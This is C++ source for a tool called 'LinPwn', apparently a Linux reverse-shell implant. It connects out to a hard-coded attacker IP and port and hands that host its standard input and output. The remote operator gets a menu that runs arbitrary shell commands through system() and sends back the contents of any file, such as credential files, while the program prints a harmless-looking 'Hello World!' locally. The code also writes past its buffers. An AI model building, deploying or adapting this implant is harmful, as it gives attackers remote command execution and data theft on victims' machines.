// Copyright 2019 <Andromeda>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>


#define BUFFER 40
#define SD 0


void banner() {
  write(SD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
  write(SD, "Type banner to show this banner.\n\0", 33);
  write(SD, "Type commands to list commands.\n\0", 33);
  write(SD, "Type exit to quit LinPwn.\n\0", 28);
}


void get_input(char *option) {
  fgets(option, 20, stdin);

  for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
    if (option[i] == '\n') {
        option[i] = '\0';
    }
  }
}


class Connection {
  const char *ip = "192.168.1.165";  // Change this
  const int port = 8000;  // Change this
  struct sockaddr_in address;

 public:
  void connection_open() {
    const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(connecting, (struct sockaddr *)&address, sizeof(address));
    dup2(connecting, SD);
    dup2(connecting, 1);
  }
};


class Commands {
  void open_file(char *option) {
    FILE *file = fopen(option, "rb");

    if (!file) {
      write(SD, "\x1b[33m Cannot open file.\n\0", 25);
      return;
    }

    fseek(file, 0, SEEK_END);
    int size = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *filecontent = new char[size];

    fread(filecontent, 1, size, file);
    filecontent[size] = '\0';
    send(SD, filecontent, size, 0);
    fclose(file);
    delete[] filecontent;
  }


 public:
  void list_commands() {
    write(SD, "\x1b[32mCommands: \n\0", 18);
    write(SD, "1. shell\n\0", 10);
    write(SD, "2. readfile\n\0", 14);
  }


  void shell() {
    char option[BUFFER];
    char errors[BUFFER] = " 2>/dev/null\0";
    write(SD, "\x1b[32mExecuting /bin/sh\n\0", 25);
    write(SD, "Type exit to return to LinPwn.\n\0", 33);

    for (;;) {
      write(SD, "\x1b[31mShell> \0", 11);
      write(SD, "\x1b[32m \0", 8);
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        strncat(option, errors, BUFFER);
        system(option);
      }
    }
  }


  void read_file() {
    char option[BUFFER];
    write(SD, "\x1b[32mType full path of file to view contents...\n\0", 50);
    write(SD, "Type exit to return to LinPwn.\n\0", 33);

    for (;;) {
      write(SD, "\x1b[31mReadFile> \0", 14);
      write(SD, "\x1b[32m \0", 8);
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        open_file(option);
      }
    }
  }


  void quit() {
    write(SD, "\x1b[33mClosing connection...\n\0", 28);
  }
};


int handler() {
  Commands commands;
  char option[BUFFER];
  get_input(option);

  if (strncmp(option, "shell\0", 6) == 0) {
    commands.shell();
  } else if (strncmp(option, "readfile\0", 9) == 0) {
    commands.read_file();
  } else if (strncmp(option, "commands\0", 10) == 0) {
    commands.list_commands();
  } else if (strncmp(option, "exit\0", 5) == 0) {
    commands.quit();
    return 1;
  } else if (strncmp(option, "banner\0", 7) == 0) {
    banner();
  } else if (strncmp(option, "", 1) == 0) {
    return 0;
  } else {
    write(SD, "\x1b[33mNot a valid option\n\0", 25);
  }

  return 0;
}


int main() {
  write(2, "\x1b[32mHello World!\n\0", 20);
  Connection connection;
  connection.connection_open();
  banner();

  for (;;) {
    write(SD, "\x1b[31m>>> \0", 10);
    if (handler() == 1) break;
  }

  return 0;
}
